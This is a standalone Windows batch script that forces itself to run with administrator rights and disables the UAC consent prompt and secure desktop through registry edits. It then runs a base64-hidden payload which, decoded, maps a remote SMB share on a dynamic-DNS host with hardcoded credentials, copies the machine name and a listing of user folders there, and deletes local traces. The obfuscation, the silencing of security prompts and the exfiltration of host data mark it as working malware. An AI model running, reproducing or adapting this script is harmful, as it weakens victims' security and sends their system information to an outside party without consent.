@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
powershell -Command "& { $encoded = 'c2V0ICJwYXJhbXM9JSoiDQpjZCAvZCAiJX5kcDAiICYmICggaWYgZXhpc3QgIiV0ZW1wJVxnZXRhZG1pbi52YnMiIGRlbCAiJXRlbXAlXGdldGFkbWluLnZicyIgKSAmJiBmc3V0aWwgZGlydHkgcXVlcnkgJXN5c3RlbWRyaXZlJSAxPm51bCAyPm51bCB8fCAoICBlY2hvIFNldCBVQUMgPSBDcmVhdGVPYmplY3ReKCJTaGVsbC5BcHBsaWNhdGlvbiJeKSA6IFVBQy5TaGVsbEV4ZWN1dGUgImNtZC5leGUiLCAiL2sgY2QgIiIlfnNkcDAiIiAmJiAlfnMwICVwYXJhbXMlIiwgIiIsICJydW5hcyIsIDEgPj4gIiV0ZW1wJVxnZXRhZG1pbi52YnMiICYmICIldGVtcCVcZ2V0YWRtaW4udmJzIiAmJiBleGl0IC9CICkNCnJlZyBhZGQgSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0gL3YgQ29uc2VudFByb21wdEJlaGF2aW9yQWRtaW4gL3QgUkVHX0RXT1JEIC9kIDAgL2YNCnJlZyBhZGQgSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0gL3YgUHJvbXB0T25TZWN1cmVEZXNrdG9wIC90IFJFR19EV09SRCAvZCAwIC9mDQpuZXQgdXNlIFxcbWluaHR1YW4yODMuZGRucy5uZXRcSEREIC91c2VyOm1pbmh0dWFuMjgzIFRoaWVubmdhbjIwMDINCmZvciAvZiAiZGVsaW1zPSIgJSVpIGluICgncG93ZXJzaGVsbCAtY29tbWFuZCAiKEdldC1DaW1JbnN0YW5jZSAtQ2xhc3NOYW1lIFdpbjMyX0NvbXB1dGVyU3lzdGVtKS5OYW1lIicpIGRvIHNldCBNYWNoaW5lTmFtZT0lJWkNCmZvciAvZiAidG9rZW5zPTIgZGVsaW1zPSAiICUlYSBpbiAoJ2RhdGUgL3QnKSBkbyBzZXQgQ3VycmVudERhdGU9JSVhDQpmb3IgL2YgInRva2Vucz0xLTIgZGVsaW1zPTogIiAlJWEgaW4gKCd0aW1lIC90JykgZG8gc2V0IEN1cnJlbnRUaW1lPSUlYSUlYg0Kc2V0IEN1cnJlbnREYXRlPSVDdXJyZW50RGF0ZTovPS0lDQpzZXQgQ3VycmVudFRpbWU9JUN1cnJlbnRUaW1lOjo9LSUNCnNldCBMb2dGaWxlTmFtZT0lTWFjaGluZU5hbWUlXyVDdXJyZW50RGF0ZSVfJUN1cnJlbnRUaW1lJS50eHQNCnNldCBMb2dGaWxlUGF0aD0ldGVtcCVcJUxvZ0ZpbGVOYW1lJQ0KZGlyICJDOlxVc2VycyIgPiAiJUxvZ0ZpbGVQYXRoJSINCm1vdmUgIiVMb2dGaWxlUGF0aCUiICJcXG1pbmh0dWFuMjgzLmRkbnMubmV0XEhERFxzZXJpYWxcbGlzdHRcJUxvZ0ZpbGVOYW1lJSINCmlmIGV4aXN0ICIlTG9nRmlsZVBhdGglIiBkZWwgIiVMb2dGaWxlUGF0aCUiDQpuZXQgdXNlIFxcbWluaHR1YW4yODMuZGRucy5uZXRcSEREIC9kZWxldGUNCnNldCBNYWNoaW5lTmFtZT0NCnNldCBDdXJyZW50RGF0ZT0NCnNldCBDdXJyZW50VGltZT0NCnNldCBMb2dGaWxlTmFtZT0NCnNldCBMb2dGaWxlUGF0aD0NCmV4aXQNCg=='; $decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded)); $decoded | Out-File -FilePath '%TEMP%\temp.bat' -Encoding ASCII; Start-Process '%TEMP%\temp.bat' -Wait; Remove-Item '%TEMP%\temp.bat' -Force; }"
exit
